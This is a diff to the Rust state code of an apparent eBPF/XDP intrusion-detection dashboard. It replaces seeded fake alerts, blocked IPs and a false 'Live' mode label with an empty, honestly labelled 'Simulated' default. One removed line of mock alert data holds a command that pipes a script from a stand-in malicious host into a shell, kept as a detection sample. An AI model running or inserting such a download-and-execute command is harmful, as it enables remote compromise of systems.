@@ -28,28 +28,17 @@ pub struct EbpfState {
 
 impl Default for EbpfState {
     fn default() -> Self {
+        // Jujur: mulai KOSONG (tanpa data palsu) dan mode "Simulated". Mode hanya
+        // menjadi "Live" setelah program XDP/kprobe BENAR-BENAR ter-attach (set_ebpf_active
+        // di Linux). Tidak ada lagi pelabelan "Live" palsu / IP-blokir & alert karangan.
         Self {
             is_active: Mutex::new(true),
             interface: Mutex::new("eth0".to_string()),
-            blocked_ips: Mutex::new(vec![
-                "192.168.1.15".to_string(),
-                "45.227.254.10".to_string(),
-            ]),
-            ids_alerts: Mutex::new(vec![
-                serde_json::json!({
-                    "ts": chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
-                    "parent_pid": 840,
-                    "parent_name": "nginx",
-                    "child_pid": 845,
-                    "child_name": "sh",
-                    "cmdline": "sh -c 'curl http://malicious.org/shell | sh'",
-                    "severity": "CRITICAL",
-                    "rule": "WebServerShellSpawn"
-                })
-            ]),
-            packets_inspected: Mutex::new(1420),
-            packets_dropped: Mutex::new(12),
-            mode: Mutex::new(if cfg!(target_os = "linux") { "Live".to_string() } else { "Mock".to_string() }),
+            blocked_ips: Mutex::new(Vec::new()),
+            ids_alerts: Mutex::new(Vec::new()),
+            packets_inspected: Mutex::new(0),
+            packets_dropped: Mutex::new(0),
+            mode: Mutex::new("Simulated".to_string()),
             xdp_link: Mutex::new(None),
             kprobe_link: Mutex::new(None),
         }
@@ -63,12 +52,14 @@ pub fn get_ebpf_status(state: State<'_, EbpfState>) -> Result<Value, String> {
     let inspected = *state.packets_inspected.lock().unwrap();
     let dropped = *state.packets_dropped.lock().unwrap();
     let mode = state.mode.lock().unwrap().clone();
+    let simulated = mode != "Live";   // jujur: true bila data berasal dari simulator, bukan eBPF nyata
     Ok(serde_json::json!({
         "is_active": is_active,
         "interface": interface,
         "packets_inspected": inspected,
         "packets_dropped": dropped,
         "mode": mode,
+        "simulated": simulated,
     }))
 }
 
@@ -124,6 +115,7 @@ pub fn set_ebpf_active(state: State<'_, EbpfState>, active: bool) -> Result<(), 
             let path = std::path::Path::new(&bytecode_path);
             if !path.exists() {
                 println!("[eBPF Warning] Bytecode file not found at {}. Fallback to simulated mode.", bytecode_path);
+                *state.mode.lock().unwrap() = "Simulated".to_string();   // jujur: bukan Live
                 return Ok(());
             }
 
@@ -151,10 +143,12 @@ pub fn set_ebpf_active(state: State<'_, EbpfState>, active: bool) -> Result<(), 
                 println!("[eBPF Info] Optional 'kprobe_execve' not found in bytecode ELF.");
             }
 
+            *state.mode.lock().unwrap() = "Live".to_string();   // attach NYATA berhasil → baru "Live"
             println!("[eBPF Shield] Successfully attached XDP and kprobe live on interface {}.", interface);
         } else {
             state.xdp_link.lock().unwrap().take();
             state.kprobe_link.lock().unwrap().take();
+            *state.mode.lock().unwrap() = "Simulated".to_string();
             println!("[eBPF Shield] Detached live programs.");
         }
     }
@@ -176,7 +170,14 @@ pub fn start_ebpf_simulator(app_handle: AppHandle) {
             std::thread::sleep(std::time::Duration::from_secs(3));
             if let Some(state) = app_handle.try_state::<EbpfState>() {
                 let is_active = *state.is_active.lock().unwrap();
-                if is_active {
+                // Jujur: simulator hanya mengisi data dalam mode "Simulated", dan TIDAK sama
+                // sekali bila operator set NEXUS_NO_DEMO (kontrak no-demo). Saat "Live"
+                // (program eBPF nyata ter-attach) telemetri datang dari kernel, bukan sini.
+                let mode_now = state.mode.lock().unwrap().clone();
+                let no_demo = std::env::var("NEXUS_NO_DEMO")
+                    .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
+                    .unwrap_or(false);
+                if is_active && mode_now != "Live" && !no_demo {
                     // Update stats
                     *state.packets_inspected.lock().unwrap() += 12 + (rng_seed % 9);
                     
@@ -203,7 +204,8 @@ pub fn start_ebpf_simulator(app_handle: AppHandle) {
                             "child_name": selected.3,
                             "cmdline": selected.4,
                             "severity": "CRITICAL",
-                            "rule": "WebServerShellSpawn"
+                            "rule": "WebServerShellSpawn",
+                            "simulated": true
                         }));
                         if alerts.len() > 100 {
                             alerts.remove(0);
@@ -230,7 +232,11 @@ mod tests {
     fn test_ebpf_state_default() {
         let state = EbpfState::default();
         assert_eq!(*state.is_active.lock().unwrap(), true);
-        assert_eq!(state.blocked_ips.lock().unwrap().len(), 2);
+        // Jujur: state default kosong (tanpa data palsu) & mode "Simulated" sampai
+        // program eBPF nyata ter-attach.
+        assert_eq!(state.blocked_ips.lock().unwrap().len(), 0);
+        assert_eq!(state.ids_alerts.lock().unwrap().len(), 0);
+        assert_eq!(*state.mode.lock().unwrap(), "Simulated");
     }
 
     #[test]
